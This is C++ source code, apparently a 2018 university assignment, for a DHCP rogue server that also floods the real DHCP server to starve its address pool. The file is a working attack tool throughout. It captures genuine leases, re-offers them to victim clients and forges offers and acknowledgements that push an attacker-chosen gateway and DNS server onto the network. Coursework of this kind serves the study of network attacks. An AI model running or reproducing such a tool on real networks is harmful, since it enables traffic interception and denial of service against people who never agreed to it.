/*
 * Autor: Lubomir Gallovic (xgallo03)
 * Datum: 5.3.2018
 * Soubor: pds-dhcprogue.cpp
 * Komentar: zdrojovy kod pre DHCP rogue server 
 */

#include "common.h"

char *interface;
unsigned int socketServer;

void signalHandler(int signum ) {

   pcap_close(handle);
   close(socketClient);
   close(socketServer);

   exit(signum);  
}

//if client timeouts during DHCP communication, remove IP reservation
void releaseTimeout(uint32_t xid, int stage) {

	struct lentAddress *lentAddress = NULL;

	std::this_thread::sleep_for(std::chrono::seconds(ROGUE_TIMEOUT_LENGTH));

	for (unsigned int i = 0; i < lentAddresses.size(); i++) {
		if (xid == lentAddresses[i].xid) {
			lentAddress = &(lentAddresses[i]);
			break;
		}
	}

	if (lentAddress == NULL)
		return;

	if (lentAddress->transactionStage == stage) {//client hasnt responded for TIMEOUT time

		for (unsigned int i = 0; i < sentPackets.size(); i++) { //address is no longer taken
			if (sentPackets[i].address == lentAddress->address) {
				sentPackets[i].taken = false;

			}
		}

		for (unsigned int i = 0; i < lentFakeAddresses.size(); i++) { //fake address is no longer taken
			if (lentFakeAddresses[i] == lentAddress->address) {
				threadAccess.lock();
				lentFakeAddresses.erase(lentFakeAddresses.begin() + i);
				threadAccess.unlock();
			}
		}

		for (unsigned int i = 0; i < lentAddresses.size(); i++) { //remove transaction 

			if (lentAddresses[i].address == lentAddress->address) {
				threadAccess.lock();
				lentAddresses.erase(lentAddresses.begin() + i);
				threadAccess.unlock();
			}
		}
	} 
}

//if lease time is over and renew/rebind hasnt been attempted, free address
void releaseLeaseOver(struct lentAddress *givenAddress) {

	//if this time doesnt correspond to current unix time, then this thread is depricated
	uint32_t startTime = givenAddress->unixTime; 
	uint32_t xid = givenAddress->xid;
	//sleep until lease if over
	std::this_thread::sleep_for(std::chrono::seconds(leaseTime));

	for (unsigned int i = 0; i < lentAddresses.size(); i++) {
		if (xid == lentAddresses[i].xid) {
			givenAddress = &(lentAddresses[i]);
			break;
		}
	}

	if (givenAddress == NULL)
		return;

	//check if lease has been extended
	if (startTime == givenAddress->unixTime) {

		for (unsigned int i = 0; i < sentPackets.size(); i++) { //address is no longer taken
			if (sentPackets[i].address == givenAddress->address) {
				sentPackets[i].taken = false;

			}
		}

		for (unsigned int i = 0; i < lentFakeAddresses.size(); i++) { //fake address is no longer taken
			if (lentFakeAddresses[i] == givenAddress->address) {
				threadAccess.lock();
				lentFakeAddresses.erase(lentFakeAddresses.begin() + i);
				threadAccess.unlock();
			}
		}

		for (unsigned int i = 0; i < lentAddresses.size(); i++) { //remove transaction 

			if (lentAddresses[i].address == givenAddress->address) {
				threadAccess.lock();
				lentAddresses.erase(lentAddresses.begin() + i);
				threadAccess.unlock();
			}
		}
	}
}

//sends fake offer using one of captured addresses
void sendOffer(struct dhcphdr *dhcpHeader) {

	for (unsigned int i = 0; i < sentPackets.size(); i++) {

		//if IP has been ACKed, and is in pool interval, and hasnt been taken by another client
		if (sentPackets[i].address >= minIP && sentPackets[i].address <= maxIP && sentPackets[i].confirmed && sentPackets[i].taken == false) {

			struct lentAddress *offeredAddress = new lentAddress();
			offeredAddress->xid = ntohl(dhcpHeader->xid);
			offeredAddress->address = sentPackets[i].address;
			offeredAddress->flags = ntohs(dhcpHeader->flags);
			offeredAddress->giaddr = ntohl(dhcpHeader->giaddr);
			offeredAddress->unixTime = 0;
			memcpy(offeredAddress->chaddr, dhcpHeader->chaddr, 16);

			//search for requested parameter list
			int position = 0;
			while (true) {
				if (dhcpHeader->options[position] == 55) {

					position++;
					int length = dhcpHeader->options[position];
					for (int j = 1; j <= length; j++) {

						if (dhcpHeader->options[position + j] == GATEWAY)
							offeredAddress->gateway = true;
						if (dhcpHeader->options[position + j] == DNS)
							offeredAddress->dnsServer = true;
						if (dhcpHeader->options[position + j] == DOMAIN_NAME)
							offeredAddress->domain = true;
					}
					position += length;
					position ++;

				} else if (dhcpHeader->options[position] == 255) {
					break;
				} else {
					position++;
					position += dhcpHeader->options[position];
					position ++;
				}
			}

			offeredAddress->transactionStage = DHCP_OFFER;

			threadAccess.lock();
			lentAddresses.push_back(*offeredAddress);
			sentPackets[i].taken = true;
			threadAccess.unlock();

			PacketCreator newPacket(DHCP_OFFER, NULL, offeredAddress, NULL);
			int size = newPacket.fillPacket();
			char *packet = newPacket.getPacket();

			int sent = pcap_inject(handle, packet, size);
			if (sent <= 0)
				fprintf(stderr, "Error sending offer packet\n");

			std::thread clientTimeout(&releaseTimeout, offeredAddress->xid, DHCP_OFFER);
			clientTimeout.detach();
			return;
		}
	}

	fprintf(stderr, "No REAL address that can be bound to client found, binding fake address\n");

	for (uint32_t possibleAddress = minIP; possibleAddress <= maxIP; possibleAddress++) {
		//fake address from pool not yet reserved
		if(std::find(lentFakeAddresses.begin(), lentFakeAddresses.end(), possibleAddress) == lentFakeAddresses.end()) {

			struct lentAddress *offeredAddress = new lentAddress();
			offeredAddress->xid = ntohl(dhcpHeader->xid);
			offeredAddress->address = possibleAddress;
			offeredAddress->flags = ntohs(dhcpHeader->flags);
			offeredAddress->giaddr = ntohl(dhcpHeader->giaddr);
			offeredAddress->unixTime = 0;
			memcpy(offeredAddress->chaddr, dhcpHeader->chaddr, 16);

			//search for requested parameter list
			int position = 0;
			while (true) {
				if (dhcpHeader->options[position] == 55) {

					position++;
					int length = dhcpHeader->options[position];
					for (int j = 1; j <= length; j++) {

						if (dhcpHeader->options[position + j] == GATEWAY)
							offeredAddress->gateway = true;
						if (dhcpHeader->options[position + j] == DNS)
							offeredAddress->dnsServer = true;
						if (dhcpHeader->options[position + j] == DOMAIN_NAME)
							offeredAddress->domain = true;
					}
					position += length;
					position ++;

				} else if (dhcpHeader->options[position] == 255) {
					break;
				} else {
					position++;
					position += dhcpHeader->options[position];
					position ++;
				}
			}

			offeredAddress->transactionStage = DHCP_OFFER;

			threadAccess.lock();
			lentAddresses.push_back(*offeredAddress);
			lentFakeAddresses.push_back(possibleAddress);
			threadAccess.unlock();

			PacketCreator newPacket(DHCP_OFFER, NULL, offeredAddress, NULL);
			int size = newPacket.fillPacket();
			char *packet = newPacket.getPacket();

			int sent = pcap_inject(handle, packet, size);
			if (sent <= 0)
				fprintf(stderr, "Error sending offer packet\n");

			std::thread clientTimeout(&releaseTimeout, offeredAddress->xid, DHCP_OFFER);
			clientTimeout.detach();
			return;
		}
	}

	fprintf(stderr, "All addresses from pool have been given to other clients\n");
	return;
}

//handles 3 types of request: REQUEST, RENEWAL, REBINDING
void handleRequest(struct dhcphdr *dhcpHeader, struct ip *ipHeader) {

	struct lentAddress *foundAddress = NULL;
	for (unsigned int i = 0; i < lentAddresses.size(); i++) { //find record of address lending transaction
		if (lentAddresses[i].xid == ntohl(dhcpHeader->xid)) {
			foundAddress = &(lentAddresses[i]);
			break;
		}
	}
	//it is possible that client sends request without offer first, despite not having leased any address
	//it is safe to ignore, because client will timeout and start standard 4 step transaction
	if (foundAddress == NULL) {
		return;
	}

	uint32_t requestIP = 0;
	uint32_t serverIP = 0;
	int position = 0;

	//iterate options
	while (true) {
		if (dhcpHeader->options[position] == REQUESTED_IP) {
			position += 2;
			requestIP = ntohl(*((uint32_t *)(&(dhcpHeader->options[position]))));
			position +=4;

		} else if (dhcpHeader->options[position] == SERVER_IDENTIFIER) {
			position += 2;
			serverIP = ntohl(*((uint32_t *)(&(dhcpHeader->options[position]))));
			position +=4;

		} else if (dhcpHeader->options[position] == 255) {
			break;
		} else {
			position++;
			position += dhcpHeader->options[position];
			position ++;
		}
	}

	if (foundAddress->transactionStage == DHCP_OFFER) { //standard request 

		if (dhcpHeader->ciaddr != 0) {
			fprintf(stderr, "ciaddr not 0 at request (weird)\n");
			return;
		}
		if (foundAddress->address != requestIP) {
			fprintf(stderr, "requested and offered IP dont match (weird)\n");
			return;
		}
		if (serverIP != myIP) {
			fprintf(stderr, "request server IP and real server IP dont match (weird)\n");
			return;
		}

	} else { //renewal and rebinding - doesnt matter as ack will be the same
		
		if (ntohl(dhcpHeader->ciaddr) != foundAddress->address) {
			fprintf(stderr, "ciaddr and lent address dont match(weird)\n");
			return;
		}
		if (requestIP != 0 || serverIP != 0) {
			fprintf(stderr, "forbidden options in renew/rebind message (weird)\n");
			return;
		}
	}

	PacketCreator newPacket(DHCP_ACK, NULL, foundAddress, NULL);
	int size = newPacket.fillPacket();
	char *packet = newPacket.getPacket();

	int sent = pcap_inject(handle, packet, size);
	if (sent <= 0)
		fprintf(stderr, "Error sending ack packet\n");


	//used to differenciate request and renew/rebind
	if (foundAddress->transactionStage == DHCP_OFFER) {
		//fprintf(stderr, "Sucessfully assigned ip of another client\n");
		std::cout << "successfully assigned to client IP: " << (int)(uint8_t)(requestIP >> 24) << "."
			 << (int)(uint8_t)(requestIP >> 16) << "." << (int)(uint8_t)(requestIP >> 8) << "."
			  << (int)(uint8_t)(requestIP) << "\n";
		foundAddress->transactionStage = DHCP_ACK;
	} else {
		//fprintf(stderr, "Successfully lenghtened lease of client\n");
		std::cout << "successfully lengthened lease of IP: " << (int)(uint8_t)(requestIP >> 24) << "."
			 << (int)(uint8_t)(requestIP >> 16) << "." << (int)(uint8_t)(requestIP >> 8) << "."
			  << (int)(uint8_t)(requestIP) << "\n";
		;
	}

	foundAddress->unixTime = (uint32_t)time(NULL);

	std::thread renewTimeout(&releaseLeaseOver, foundAddress);
	renewTimeout.detach();

	return;
}

//if client sends dhcp release, frees IP
void handleRelease(struct dhcphdr *dhcpHeader) {

	struct lentAddress *foundAddress = NULL;
	for (unsigned int i = 0; i < lentAddresses.size(); i++) { //find record of address lending transaction

		if (lentAddresses[i].address == ntohl(dhcpHeader->ciaddr)) {
			foundAddress = &(lentAddresses[i]);
			break;
		}
	}

	if (foundAddress == NULL) {
		return;
	}

	for (unsigned int i = 0; i < sentPackets.size(); i++) { //address is no longer taken
		if (sentPackets[i].address == foundAddress->address) {
			sentPackets[i].taken = false;
		}
	}

	for (unsigned int i = 0; i < lentFakeAddresses.size(); i++) { //fake address is no longer taken
		if (lentFakeAddresses[i] == foundAddress->address) {
			threadAccess.lock();
			lentFakeAddresses.erase(lentFakeAddresses.begin() + i);
			threadAccess.unlock();
		}
	}

	for (unsigned int i = 0; i < lentAddresses.size(); i++) { //remove transaction 

		if (lentAddresses[i].address == foundAddress->address) {
			threadAccess.lock();
			lentAddresses.erase(lentAddresses.begin() + i);
			threadAccess.unlock();
		}
	}
}

//pcap_loop packet handling function
void capturePacket(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {

	struct dhcphdr *dhcpHeader;
	struct udphdr *udpHeader;
	struct ip *ipHeader;
	struct ethhdr *ethHeader;
	uint32_t serverID;

	ethHeader = (struct ethhdr *)(packet);
	ipHeader = (struct ip *)(packet + sizeof(struct ethhdr));
	udpHeader = (struct udphdr *)(((char *)ipHeader) + ipHeader->ip_hl*4); //ip header has variable length
	dhcpHeader = (struct dhcphdr *)(((char *)udpHeader) + sizeof(struct udphdr));

	int type = getMessageType(dhcpHeader, &serverID);

	if (type == -1) // not dhcp packet
		return;

	//DHCP STARVE, MESSAGES FROM REAL SERVER
	if (type == DHCP_OFFER) {
		if (sendRequest(dhcpHeader, &serverID) == -1)
			;
			//fprintf(stderr, "DHCP offer data not found in database\n");
	} else if (type == DHCP_ACK) {
		if (confirmAck(dhcpHeader, ipHeader, ethHeader) == -1)
			;
			//fprintf(stderr, "DHCP ack data not found in database\n");

	//DHCP ROGUE SERVER, MESSAGES FROM UNSUSPECTING CLIENT
	} else if (type == DHCP_DISCOVER) {
		sendOffer(dhcpHeader);
	} else if (type == DHCP_REQUEST) {
		handleRequest(dhcpHeader, ipHeader);
	} else if (type == DHCP_RELEASE) {
		handleRelease(dhcpHeader);
	}
}

//listens to port 67 because unavailiable port error
void socketListener() {

	struct sockaddr_in myAddress, otherAddress;
	uint32_t serverID;
     
    unsigned int slen = sizeof(otherAddress) , recv_len;
    char buf[BUFLEN];
     
    if ((socketClient=socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1) 
        return;
    
    memset((char *) &myAddress, 0, sizeof(myAddress));

    myAddress.sin_family = AF_INET;
    myAddress.sin_port = htons(SERVER_PORT);
    myAddress.sin_addr.s_addr = htonl(INADDR_ANY);

    if( bind(socketClient , (struct sockaddr*)&myAddress, sizeof(myAddress)) == -1)
        return;

    while(true) {  
        if ((recv_len = recvfrom(socketClient, buf, BUFLEN, 0, (struct sockaddr *) &otherAddress, &slen)) == -1)
            return;      
    }

}

int parseArguments(char *argInterface, char *argPool, char *argGateway, char *argDnsServer, char *argDomain, char *argLeaseTime) {

	//interface
	if (argInterface == NULL) {
		fprintf(stderr, "No interface given\n");
		return -1;
	}
	interface = argInterface;

	//get interface address (for fake server)
	struct ifaddrs *addresses, *tmp;
	getifaddrs(&addresses);
	tmp = addresses;
	bool found = false;
	
	while (tmp) {
		if (tmp->ifa_addr && tmp->ifa_addr->sa_family == AF_INET) {
        	struct sockaddr_in *address = (struct sockaddr_in *)tmp->ifa_addr;
        	if (strcmp(tmp->ifa_name, interface) == 0) {

        		myIP = ntohl(address->sin_addr.s_addr);
        		found = true;
        		struct sockaddr_in *mask = (struct sockaddr_in *)tmp->ifa_netmask;
        		realMask = ntohl(mask->sin_addr.s_addr);
        		break;
        	}
    	}

    	tmp = tmp->ifa_next;
	}
	if (found == false) {
		fprintf(stderr, "Couldnt find device\n");
		return -1;
	}
	freeifaddrs(addresses);

	//ip pool
	if (argPool == NULL) {
		fprintf(stderr, "No pool given\n");
		return -1;
	}
	std::string pool(argPool);
	std::istringstream ss(pool);
	std::string token;
	int counter = 0;
	char firstIPstr[20];
	char lastIPstr[20];

	while(std::getline(ss, token, '-')) {
    	if (counter == 0)
    		strcpy(firstIPstr, token.c_str());
    	else if (counter == 1)
    		strcpy(lastIPstr, token.c_str());
    	counter++;
	}

	if (counter != 2) {
		fprintf(stderr, "Invalid pool address format\n");
		return -1;
	}

	struct sockaddr_in firstIP, lastIP;
	if (inet_pton(AF_INET, firstIPstr, &(firstIP.sin_addr)) == 0 || inet_pton(AF_INET, lastIPstr, &(lastIP.sin_addr)) == 0) {
		fprintf(stderr, "Invalid pool address\n");
		return -1;
	}
	minIP = ntohl(firstIP.sin_addr.s_addr);
	maxIP = ntohl(lastIP.sin_addr.s_addr);

	if (maxIP < minIP) {
		fprintf(stderr, "Invalid address pool\n");
		return -1;
	}

	//gateway
	if (argGateway == NULL) {
		fprintf(stderr, "No gateway given\n");
		return -1;
	}
	struct sockaddr_in gatewayIP;
	if (inet_pton(AF_INET, argGateway, &(gatewayIP.sin_addr)) == 0) {
		fprintf(stderr, "Invalid gateway address\n");
		return -1;
	}
	gateway = ntohl(gatewayIP.sin_addr.s_addr);

	//dns server
	if (argDnsServer == NULL) {
		fprintf(stderr, "No DNS server given\n");
		return -1;
	}
	struct sockaddr_in dnsIP;
	if (inet_pton(AF_INET, argDnsServer, &(dnsIP.sin_addr)) == 0) {
		fprintf(stderr, "Invalid DNS address\n");
		return -1;
	}
	dns = ntohl(dnsIP.sin_addr.s_addr);

	//domain
	if (argDomain == NULL) {
		fprintf(stderr, "No domain name given\n");
		return -1;
	}
	domain = argDomain;

	//lease time
	if (argLeaseTime == NULL) {
		fprintf(stderr, "No lease time given\n");
		return -1;
	}
	char *end = NULL;
	leaseTime = strtol(argLeaseTime, &end, 10);
	if (leaseTime == 0 || strcmp(end, "") != 0) {
		fprintf(stderr, "Invalid lease time\n");
		return -1;
	}
	renewTime = (int)leaseTime*0.5;
	rebindTime = (int)leaseTime*0.875;

	return 0;

}

int main(int argc, char *argv[]) {

	srand(time(NULL));

	char *argInterface, errbuf[PCAP_ERRBUF_SIZE];
	char *argPool = NULL;
	char *argGateway = NULL;
	char *argDnsServer = NULL;
	char *argDomain = NULL;
	char *argLeaseTime = NULL;

	struct bpf_program fp;
	char filter_exp[] = "port 67 or port 68";
	bpf_u_int32 mask;
	bpf_u_int32 net;	
	int opt;

	while ((opt = getopt(argc, argv, "i:p:g:n:d:l:")) != -1) {
		switch (opt) {
		case 'i':
			argInterface = optarg;
			break;
		case 'p':
			argPool = optarg;
			break;
		case 'g':
			argGateway = optarg;
			break;
		case 'n':
			argDnsServer = optarg;
			break;
		case 'd':
			argDomain = optarg;
			break;
		case 'l':
			argLeaseTime = optarg;
			break;
		default:
			return -1;
			break;
		}
	}

	if (parseArguments(argInterface, argPool, argGateway, argDnsServer, argDomain, argLeaseTime) == -1)
		return -1;

	if (pcap_lookupnet(interface, &net, &mask, errbuf) == -1) {
		 fprintf(stderr, "Mask lookup failed: %s\n", errbuf);
		 return -1;
	 }

	handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
	 if (handle == NULL) {
		 fprintf(stderr, "Error accessing interface %s: %s\n", interface, errbuf);
		 return -1;
	 }

	signal(SIGINT, signalHandler);  

	std::thread socketClientThread(&socketClientListener);
	socketClientThread.detach();

	std::thread socketThread(&socketListener);
	socketThread.detach();

	std::thread timeoutWatcher(&watchTimeout);
	timeoutWatcher.detach();

	std::thread discoveryFlooder(&floodDiscovery);
	discoveryFlooder.detach();

	 if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
		 fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
		 return -1;
	 }

	 if (pcap_setfilter(handle, &fp) == -1) {
		 fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
		 return -1;
	 }

	 if (pcap_loop(handle, -1, capturePacket, NULL) == -1) {
		 fprintf(stderr, "Error PCAP LOOP\n");
		 return -1;
	 }

}